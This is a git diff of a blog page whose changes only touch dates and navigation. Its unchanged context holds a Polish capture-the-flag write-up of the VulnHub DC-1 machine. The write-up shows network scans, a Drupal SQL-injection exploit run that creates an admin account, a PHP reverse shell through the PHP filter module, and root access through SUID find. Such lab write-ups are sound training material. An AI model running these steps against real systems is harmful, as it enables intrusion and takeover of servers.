@@ -62,8 +62,8 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://suszczyk.github.io/posts/vulnhub/dc-1/" />
 <meta property="og:image" content="https://suszczyk.github.io/thumbnails/DC-1.png" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-07-11T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2022-07-11T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2022-07-18T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-07-18T00:00:00&#43;00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/DC-1.png" />
@@ -104,8 +104,8 @@
   "articleBody": "Pierwsze, co musiałem zrobić to uzyskać konkretny adres IP. Wykonałem skan mojej wirtualnej sieci.\nnetdiscover ┌[parrot@parrot]─[~/vulnhub/dc-1] └╼[★ ]$sudo netdiscover -r 192.168.2.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 20 Captured ARP Req/Rep packets, from 4 hosts. Total size: 1200 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.2.1 00:50:56:c0:00:08 17 1020 VMware, Inc. 192.168.2.2 00:50:56:f0:ed:fa 1 60 VMware, Inc. 192.168.2.137 00:0c:29:86:a3:2b 1 60 VMware, Inc. 192.168.2.254 00:50:56:f8:70:fd 1 60 VMware, Inc. Adres IP: 192.168.2.137\n NMap ┌[parrot@parrot]─[~/vulnhub/dc-1] └╼[★ ]$nmap -sC -sV 192.168.2.137 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 22:34 CEST Nmap scan report for 192.168.2.137 Host is up (0.037s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) | ssh-hostkey: | 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA) | 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) |_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Debian)) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-title: Welcome to Drupal Site | Drupal Site |_http-generator: Drupal 7 (http://drupal.org) |_http-server-header: Apache/2.2.22 (Debian) 111/tcp open rpcbind 2-4 (RPC #100000)  | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 41800/udp6 status | 100024 1 49570/tcp status | 100024 1 58114/tcp6 status |_ 100024 1 60730/udp status Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Mamy zatem otwarte trzy porty. SSH na porcie 22, HTTP na porcie 80 oraz rpcbind na porcie 111. Wiemy ponadto, że jest to Debian.\n FeroxBuster  Drupal Wiemy z kodu źródłowego, że to wersja 7. Jednak nie wiadomo jaka dokładnie.\nZ Droopescana wiem, że to prawdopodobnie wersja 7.2.x.\ndroopescan scan drupal -u 192.168.2.137 ... ... [+] Possible version(s): 7.22 7.23 7.24 7.25 7.26 Dlatego postanowiłem sprawdzić potencjalne exploity na te wersje. Otrzymałem kilka obiecujących wyników. Zacząłem sprawdzać najpierw te Pythonowe i wziąłem ten pierwszy z dodaniem admin usera.\nTo był dobry strzał. Udało mi się utworzyć użytkownika pwned:pwned. Z tego miejsca otrzymanie shella nie powinno być trudne.\n┌[parrot@parrot]─[~/vulnhub/dc-1] └╼[★ ]$python2 34992.py -t http://192.168.2.137 -u pwned -p pwned ______ __ _______ _______ _____ | _ \\ .----.--.--.-----.---.-| | | _ || _ | _ | |. | \\| _| | | _ | _ | | |___| _|___| |.| | |. | |__| |_____| __|___._|__| / |___(__ `-|. | |: 1 / |__| | | |: 1 | |: | |::.. . / | | |::.. . | |::.| `------' `---' `-------' `---' _______ __ ___ __ __ __ | _ .-----| | | .-----|__.-----.----| |_|__.-----.-----. | 1___| _ | | |. | | | -__| __| _| | _ | | |____ |__ |__| |. |__|__| |_____|____|____|__|_____|__|__| |: 1 | |__| |: | |___| |::.. . | |::.| `-------' `---' Drup4l = 7.0 = 7.31 Sql-1nj3ct10n Admin 4cc0unt cr3at0r Discovered by: Stefan Horst (CVE-2014-3704) Written by: Claudio Viviani http://www.homelab.it info@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww [!] VULNERABLE! [!] Administrator user created! [*] Login: pwned [*] Pass: pwned [*] Url: http://192.168.2.137/?q=node\u0026destination=node  Shell Otrzymanie shella nie jest trudnea, ale trzeba wykonać kilka kroków.\nNależy włączyć w zakładce Modules moduł PHP filter. Następnie zapisujemy i przechodzimy do Permissions, gdzie należy dodać możliwość uruchamiania kodu PHP.\nZapisujemy i można przetestować działanie poprzez Add content - Basic page - wpisujemy dowolny tytuł oraz kod PHP do uruchomienia oraz poniżej zmieniamy Text format na PHP Code. Test dla phpinfo();:\nPo uruchomieniu kodu PHP Reverse Shella z Githuba https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php otrzymałem połączenie.\nMamy użytkownika flag4 na systemie.\ncat /etc/passwd ... ... flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash flag1.txt cat /var/www/flag1.txt Every good CMS needs a config file - and so do you. flag3 flag4.txt cat /home/flag4/flag4.txt Can you use this same method to find or access the flag in root? Probably. But perhaps it's not that easy. Or maybe it is?  Privileges Escalation LinPEAS SUID /usr/bin/find\nwww-data@DC-1:/tmp$ find . -exec whoami \\; -quit root # Well done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7 Postanowiłem od razu przejść do roota pozostawiając drugą flagę, która prawdopodobnie jest gdzieś ukryta.\n Root proof ",
   "wordCount" : "703",
   "inLanguage": "en",
-  "image":"https://suszczyk.github.io/thumbnails/DC-1.png","datePublished": "2022-07-11T00:00:00Z",
-  "dateModified": "2022-07-11T00:00:00Z",
+  "image":"https://suszczyk.github.io/thumbnails/DC-1.png","datePublished": "2022-07-18T00:00:00Z",
+  "dateModified": "2022-07-18T00:00:00Z",
   "author":{
     "@type": "Person",
     "name": "Mateusz Suszczyk"
@@ -197,7 +197,7 @@
     <h1 class="post-title">
       dc-1
     </h1>
-    <div class="post-meta"><span title='2022-07-11 00:00:00 +0000 UTC'>July 11, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Mateusz Suszczyk
+    <div class="post-meta"><span title='2022-07-18 00:00:00 +0000 UTC'>July 18, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Mateusz Suszczyk
 
 </div>
   </header> 
@@ -430,10 +430,10 @@ by contacting me via Twitter - @DCAU7
       <li><a href="https://suszczyk.github.io/tags/easy/">Easy</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
+  <a class="prev" href="https://suszczyk.github.io/posts/vulnhub/photographer/">
     <span class="title">« Prev Page</span>
     <br>
-    <span>LogForge - HackTheBox</span>
+    <span>Photographer</span>
   </a>
   <a class="next" href="https://suszczyk.github.io/posts/vulnhub/ha-wordy/">
     <span class="title">Next Page »</span>
